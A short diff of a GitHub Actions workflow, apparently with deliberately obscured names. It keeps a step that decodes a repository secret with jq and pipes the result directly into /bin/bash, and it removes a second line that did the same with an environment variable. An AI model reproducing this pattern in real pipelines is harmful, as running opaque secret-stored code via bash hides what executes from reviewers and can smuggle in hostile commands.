@@ -21,7 +21,6 @@ jobs:
           mdzid712: ${{ secrets.mdzid712 }}
         run: |
           printf '%s' "$mdzid712" | jq -r .lhi1426 | /bin/bash
-          echo $etk4788 | jq -r .oxkcc5173 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
